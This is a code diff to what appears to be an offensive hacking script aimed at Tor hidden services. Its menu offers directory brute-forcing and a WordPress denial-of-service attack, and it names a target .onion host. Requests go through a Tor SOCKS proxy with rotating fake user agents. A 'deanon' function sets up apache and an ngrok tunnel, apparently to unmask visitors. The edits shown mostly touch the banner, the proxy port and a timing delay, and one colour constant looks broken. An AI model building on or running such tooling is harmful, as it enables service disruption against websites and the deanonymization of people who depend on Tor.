@@ -18,10 +18,10 @@ print("""
 
         Connecting to the Tor...
 
-[+]█████████████████████████████████████[+]                                                     
+  [+]███████████████████████████████[+]                                                     
   """)
 
-print("  [+]  Version 0.2")
+print(Fore.Green + "  [+] " + Fore.WHITE + " Version 0.2")
 
 print(Fore.WHITE + """
   {1}  Directory Brute  {2}  Wordpress DoS
@@ -36,7 +36,7 @@ print(Fore.WHITE + """
 host = 'http://ddosogyyqstchmnx.onion'
 
 global proxies
-proxies = { 'http': 'socks5://127.0.0.1:9150', 'https': 'socks5://127.0.0.1:9150' }
+proxies = { 'http': 'socks5://127.0.0.1:9050', 'https': 'socks5://127.0.0.1:9050' }
 
 global useragents
 useragents = [ "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
@@ -146,6 +146,7 @@ def deanon():
   subp.check_output(['service', 'apache2', 'start'])
   print('\n' + '[+]' + ' Starting Ngrok...' + '\n')
   subp.Popen(['ngrok', 'http', '80'], stdin=subp.PIPE,stderr=subp.PIPE, stdout=subp.PIPE)
+  time.sleep(10)
   r1 = requests.get('{}'.format(api))
   page = r1.content
   json1 = json.loads(page)
